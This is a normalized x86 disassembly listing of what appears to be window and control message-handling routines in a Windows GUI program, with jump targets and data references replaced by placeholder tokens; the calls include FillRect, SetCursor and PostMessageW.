mov edx esi
mov ecx ebx
mov eax ebx
call sub_47688c
test al al
je r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0xc ] 0x0
jne r-xdata
mov eax ebx
call sub_47a060
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_477c90
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
call sub_485c78
mov edi eax
mov eax edi
call sub_485d84
test al al
je r-xdata
cmp [ ebx + 0x260 ] 0x0
je r-xdata
cmp [ ebx + 0x34 ] 0x0
je r-xdata
mov eax [ ebx + 0x1c0 ]
call sub_44cd7c
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x54 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
jne r-xdata
test [ ebx + 0x52 ] 0x4
je r-xdata
mov [ esi + 0xc ] 0x1
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x34 ]
cmp [ eax + 0x260 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_479ce0
mov edx eax
mov ecx [ esi + 0x4 ]
mov eax edi
call sub_486038
jmp r-xdata
mov edx [ esi + 0x4 ]
mov eax ebx
call sub_46d834
jmp r-xdata
sub_477d30
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov esi [ ebp + 0x8 ]
cmp [ edi + 0x1e9 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x50 ] 0x10
je r-xdata
test [ esi + 0x18 ] 0x2
jne r-xdata
cmp [ edi + 0x34 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi + 0x258 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
test [ esi + 0x18 ] 0x8
je r-xdata
mov [ esp ] al
test [ esi + 0x18 ] 0x1
jne r-xdata
mov al 0x1
mov bl 0x1
xor eax eax
jmp r-xdata
mov eax [ edi + 0x258 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x1 ] al
test bl bl
je r-xdata
mov al 0x1
test [ edi + 0x55 ] 0x2
jne r-xdata
movzx eax [ esp ]
or al [ esp + 0x1 ]
je r-xdata
mov edx ebp
mov eax edi
call sub_473210
test bl bl
je r-xdata
mov eax edi
call sub_47a06c
mov eax edi
call sub_479be4
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
movzx eax [ esp ]
or al [ esp + 0x1 ]
jne r-xdata
mov eax edi
call sub_479be4
test [ esi + 0x18 ] 0xc0
je r-xdata
sub_477de8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
movzx eax [ r-xdata ]
and ax [ ebx + 0x1c ]
movzx edx [ r-xdata ]
cmp dx ax
jne r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x8 ]
mov esi eax
test [ esi + 0x18 ] 0x1
jne r-xdata
lea ecx [ esi + 0x14 ]
lea edx [ esi + 0x10 ]
mov eax ebx
call sub_472e3c
test al al
jne r-xdata
or [ esi + 0x18 ] 0x1
sub_477e3c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_47a06c
mov eax esi
call sub_474070
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor ebx ebx
mov eax [ esi + 0x34 ]
test eax eax
je r-xdata
mov eax [ esi + 0x1a8 ]
test eax eax
je r-xdata
cmp [ eax + 0x1a8 ] 0x0
je r-xdata
test ebx ebx
je r-xdata
mov ebx eax
mov ebx [ eax + 0x1a8 ]
jmp r-xdata
xor edx edx
mov eax esi
call sub_4752e0
test [ esi + 0x1c ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
call sub_430608
inc eax
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov si 0xffd0
call sub_40587c
mov edx esi
mov eax ebx
call sub_4303e0
pop esi
pop ebx
retn
sub_477ed4
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
cmp eax [ ebx + 0x258 ]
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
movzx eax [ esi + 0x8 ]
sub ax 0xfffe
je r-xdata
cmp [ esi + 0xa ] 0x201
jne r-xdata
sub ax 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x170 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
movzx edi [ eax + 0x48 ]
test di di
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x170 ]
push eax
call GetLastActivePopup
mov edi eax
call GetForegroundWindow
cmp edi eax
je r-xdata
test di di
je r-xdata
push esp
call GetCursorPos
push 0x0
push 0x0
lea ecx [ esp + 0x10 ]
lea edx [ esp + 0x8 ]
mov eax ebx
call sub_470990
lea edx [ esp + 0x10 ]
xor ecx ecx
mov eax ebx
call sub_476708
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_49ff58
movsx edx di
mov eax [ rw-data ]
mov eax [ eax ]
call sub_49dac4
push eax
call SetCursor
mov [ esi + 0xc ] 0x1
jmp r-xdata
test di di
jne r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
movzx edi [ eax + 0x78 ]
mov di 0xfffe
jmp r-xdata
movzx edi [ ebx + 0x78 ]
mov di 0xfffe
jmp r-xdata
sub_478028
mov ecx [ rw-data ]
cmp [ ecx ] 0x0
je r-xdata
mov eax [ eax + 0x34 ]
test eax eax
je r-xdata
mov eax [ edx + 0x8 ]
push eax
mov eax [ edx + 0x4 ]
push eax
push 0xb056
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x170 ]
push eax
call PostMessageW
retn
test eax eax
je r-xdata
mov ecx [ eax + 0x34 ]
test ecx ecx
je r-xdata
retn
mov ecx [ edx + 0x8 ]
push ecx
mov ecx [ edx + 0x4 ]
mov edx 0xb056
call sub_472314
mov eax ecx
test eax eax
jne r-xdata
sub_478094
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x34 ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1a8 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_47810e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_46ffa4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x34 ]
cmp [ edx + 0x1a8 ] 0x0
jne r-xdata
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
xor edx edx
mov [ eax + 0x1a8 ] edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x34 ]
mov [ edx + 0x1a8 ] eax
mov [ ebp - 0x5 ] 0x1
sub_47811c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi eax
xor eax eax
push ebp
push sub_4781fc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478203
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
cmp [ esi + 0x1d0 ] 0x0
je r-xdata
mov eax esi
call sub_479ce0
movzx edx [ esi + 0x1cc ]
call sub_47fdb4
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_49da3c
mov edx [ ebp - 0x4 ]
mov eax [ esi + 0x1d0 ]
call sub_411254
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_49d7f8
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edi [ eax + 0x40 ]
cmp [ esi + 0x1cc ] 0x0
je r-xdata
push 0x1
push edi
call ActivateKeyboardLayout
mov eax [ rw-data ]
mov eax [ eax ]
call sub_49d7f8
mov edx [ esi + 0x1d0 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov ebx eax
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_49d7f8
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
sub_47820c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_478296
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47829d
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
cmp [ ebx + 0x1d0 ] 0x0
je r-xdata
cmp [ ebx + 0x1cc ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_49da3c
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1d0 ]
call sub_411254
test eax eax
je r-xdata
mov eax ebx
call sub_479ce0
mov dl 0x1
call sub_47fd98
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x40 ]
push eax
call ActivateKeyboardLayout
sub_4782f0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov [ ebp - 0x4 ] di
movzx eax [ ebp + 0x8 ]
mov [ ebp - 0x2 ] ax
mov eax [ ebp - 0x4 ]
push eax
mov ecx esi
mov edx 0xb038
mov eax ebx
call sub_472314
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
cmp [ ebx + 0x1f2 ] 0x0
je r-xdata
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x1f4 ]
call [ ebx + 0x1f0 ]
sub_478348
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1fa ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0xc
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
movzx ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x1fc ]
call [ ebx + 0x1f8 ]
sub_47837c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov si 0xffd2
call sub_40587c
mov eax [ ebp + 0x10 ]
push eax
movzx eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
mov si 0xffc2
call sub_40587c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_4783bc
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
cmp [ ebx + 0x232 ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esi
lea eax [ esp + 0x4 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x234 ]
call [ ebx + 0x230 ]
xor eax eax
jmp r-xdata
push edi
mov ecx esi
mov edx 0xb039
mov eax ebx
call sub_472314
test eax eax
je r-xdata
mov [ esp ] al
movzx eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_478418
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_43c860
mov edx [ r-xdata ]
call sub_405830
mov [ edi ] eax
pop edi
pop esi
pop ebx
retn
sub_478450
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x1c4 ]
test esi esi
je r-xdata
xor eax eax
mov edx edi
mov eax esi
call sub_4305a0
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_478474
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov edi edx
mov ebx eax
push esi
mov eax ebx
call sub_479ce0
push eax
call GetWindowRect
push 0xa
push 0xa
push esi
call InflateRect
cmp [ ebx + 0x212 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
push esi
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x214 ]
call [ ebx + 0x210 ]
sub_4784d0
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_47843c
mov edi eax
test edi edi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov ebx edi
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x1c4 ]
call sub_4305a0
cmp [ eax + 0x59 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec edi
sub_478510
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c8 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x1c8 ]
call sub_409ccc
cmp [ ebx + 0x1ec ] 0x0
je r-xdata
mov dl 0x1
cmp [ esi ] 0x0
jne r-xdata
cmp [ ebx + 0x1eb ] 0x0
je r-xdata
xor edx edx
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x44 ]
mov edx eax
test edx edx
je r-xdata
mov eax ebx
call sub_478668
pop esi
pop ebx
retn
mov eax esi
call sub_409ccc
jmp r-xdata
sub edx 0xffffff88
cmp [ ebx + 0x260 ] 0x0
jne r-xdata
sub_47857c
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x10
je r-xdata
pop ebx
retn
test [ ebx + 0x55 ] 0x8
setne al
xor al 0x1
cmp dl al
je r-xdata
test dl dl
jne r-xdata
and [ ebx + 0x54 ] 0xfffff7ff
or [ ebx + 0x54 ] 0x800
jmp r-xdata
mov eax ebx
call sub_476288
sub_4785b0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_478658
push [ fs : eax ]
mov [ fs : eax ] esp
cmp bl [ edi + 0x1ec ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47865f
lea eax [ ebp - 0x4 ]
call sub_409cb4
retn
mov [ edi + 0x1ec ] bl
test [ edi + 0x1c ] 0x10
jne r-xdata
mov edx ebx
mov eax edi
call sub_46e514
test bl bl
jne r-xdata
cmp [ edi + 0x1c4 ] 0x0
jne r-xdata
mov eax [ edi + 0x1c4 ]
call sub_4055f0
xor eax eax
mov [ edi + 0x1c4 ] eax
lea eax [ edi + 0x1c8 ]
call sub_409cb4
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffc5
call sub_40587c
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x1c8 ]
call sub_409ccc
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov [ edi + 0x1c4 ] eax
sub_47868c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
lea esi [ eax + 0x4c ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x2
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_479ce0
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x4 ]
inc [ eax + 0x1ac ]
xor edx edx
push ebp
push sub_478751
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x40 ]
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
mov si 0xffcc
call sub_40587c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1eb ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478758
mov eax [ ebp - 0x4 ]
call sub_47537c
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1c8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ eax + 0x60 ]
push edx
mov edx [ ebp - 0x8 ]
movzx ecx [ eax + 0x5c ]
mov edx [ ebp - 0x8 ]
mov edx [ eax + 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c8 ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
sub_478758
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_4946a4
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4710cc
sub_4787a4
push ebp
mov ebp esp
add esp 0xfffffff8
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov ecx [ ebp - 0x4 ]
mov ecx [ ecx ]
mov edx ecx
cmp edx eax
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_473764
pop esi
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x59 ]
mov [ ebp - 0x5 ] al
xor eax eax
push ebp
push sub_47880b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x8 ]
lea ecx [ eax + 0x4c ]
xor edx edx
mov eax [ ebp - 0x4 ]
mov si 0xffcc
call sub_40587c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
retn
mov eax [ ebp - 0x4 ]
call sub_4710cc
sub_478824
push ebx
push ecx
mov [ esp ] cx
cmp [ eax + 0x21a ] 0x0
je r-xdata
pop edx
pop ebx
retn
movzx ecx [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x21c ]
call [ ebx + 0x218 ]
sub_478850
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov edi edx
mov esi eax
mov bl 0x1
xor edx edx
mov eax esi
call sub_4946a4
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_494560
mov ebp eax
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
movzx eax [ edi + 0x4 ]
mov [ esp + 0x4 ] ax
lea edx [ esp + 0x4 ]
mov ecx ebp
mov eax esi
mov si 0xffba
call sub_40587c
movzx eax [ esp + 0x4 ]
mov [ edi + 0x4 ] ax
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x29c ] 0x0
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x34 ] 0x0
je r-xdata
mov edx edi
mov eax ebp
call sub_478850
test al al
jne r-xdata
mov dl 0x1
mov eax ebp
call sub_4946a4
mov [ esp ] eax
cmp [ esp ] 0x0
je r-xdata
cmp ebp [ esp ]
je r-xdata
mov eax [ esp ]
cmp [ eax + 0x29c ] 0x0
je r-xdata
mov edx edi
mov eax [ esp ]
call sub_478850
test al al
jne r-xdata
sub_478904
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_478850
test al al
jne r-xdata
movzx edx [ esi + 0x4 ]
mov eax ebx
call sub_47b010
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_478930
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_478850
test al al
jne r-xdata
movzx edx [ esi + 0x4 ]
mov eax ebx
call sub_47b010
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_47895c
push ebx
push ecx
mov [ esp ] cx
cmp [ eax + 0x22a ] 0x0
je r-xdata
pop edx
pop ebx
retn
movzx ecx [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x22c ]
call [ ebx + 0x228 ]
sub_478988
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov dl 0x1
mov eax esi
call sub_4946a4
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_494560
mov ebp eax
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
movzx eax [ edi + 0x4 ]
mov [ esp ] ax
mov edx esp
mov ecx ebp
mov eax esi
mov si 0xffb9
call sub_40587c
movzx eax [ esp ]
mov [ edi + 0x4 ] ax
cmp [ esp ] 0x0
je r-xdata
cmp [ ebp + 0x29c ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_478988
test al al
jne r-xdata
sub_4789fc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_478988
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_478a1c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_478988
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_478a5c
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov dl 0x1
mov eax esi
call sub_4946a4
mov ebp eax
test ebp ebp
je r-xdata
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
movzx eax [ edi + 0x4 ]
mov [ esp ] ax
mov edx esp
mov eax esi
mov si 0xffb8
call sub_40587c
movzx eax [ esp ]
mov [ edi + 0x4 ] ax
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x29c ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_478a5c
test al al
jne r-xdata
sub_478ac4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_478a5c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_478ae4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1ea ] 0x0
je r-xdata
movzx eax [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_475884
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x5c ]
test al al
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_475848
mov ebx eax
cmp [ ebx + 0x59 ] 0x0
je r-xdata
test [ ebx + 0x52 ] 0x1
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax ebx
call sub_472314
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_478ae4
pop ecx
test al al
je r-xdata
mov [ ebp - 0x5 ] 0x1
jmp r-xdata
sub_478b94
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov ebx eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x8 ] 0x20
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
push ebp
mov eax ebx
call sub_478ae4
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x8 ] 0x2d
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebx + 0x258 ]
push eax
call IsIconic
test eax eax
jne r-xdata
call GetCapture
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp ebx [ eax + 0x44 ]
je r-xdata
mov dl 0x1
mov eax ebx
call sub_4946a4
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
xor ecx ecx
mov edx 0xb017
mov eax esi
call sub_472314
test eax eax
jne r-xdata
sub_478c40
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_47707c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_478c60
push ebx
push esi
push edi
mov ebx edx
mov edi eax
movzx esi [ ebx + 0x4 ]
cmp si 0x1
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_47707c
test al al
jne r-xdata
cmp si 0x2
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_478c94
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_47707c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_478cb4
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebx eax
cmp [ ebx + 0x174 ] 0x0
jne r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax ebx
call sub_47b9d4
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_470dc0
mov esi eax
cmp esi 0x1
jge r-xdata
lea eax [ esi + 0x1 ]
call sub_4128b8
mov ebp eax
mov [ ebx + 0x174 ] ebp
mov eax ebp
call sub_4128c0
mov ecx eax
mov edx ebp
mov eax ebx
call sub_470dd0
mov eax sub_478d1c
call sub_4128cc
mov [ ebx + 0x174 ] eax
jmp r-xdata
sub_478d3c
push esi
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
cmp [ esi + 0x34 ] 0x0
je r-xdata
mov [ edx + 0xc ] 0x1
pop esi
retn
sub_478d60
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebp eax
movzx edx [ esp ]
mov eax ebp
call sub_46fd48
mov ebx eax
cmp [ ebp + 0x59 ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_475884
mov edi eax
dec edi
cmp edi 0x0
jl r-xdata
test [ esp ] bl
jne r-xdata
mov edx edi
mov eax ebp
call sub_475848
movzx edx [ esp ]
mov si 0xffd1
call sub_40587c
or bl al
dec edi
cmp edi 0xffffffff
jne r-xdata
sub_478db8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
or [ ebx + 0x54 ] 0x4
mov dl 0x1
mov eax ebx
mov si 0xffd1
call sub_40587c
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_478ddc
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor edx edx
mov eax ebx
mov si 0xffd1
call sub_40587c
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_478e14
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_473488
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov dx 0xb03d
mov eax ebx
call sub_475914
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax ebx
call sub_4761e4
sub_478e4c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov dx 0xb050
mov eax esi
call sub_475914
mov eax esi
mov edx [ eax ]
call [ edx + 0x90 ]
pop esi
retn
sub_478e70
push ebx
push esi
push ecx
mov ebx eax
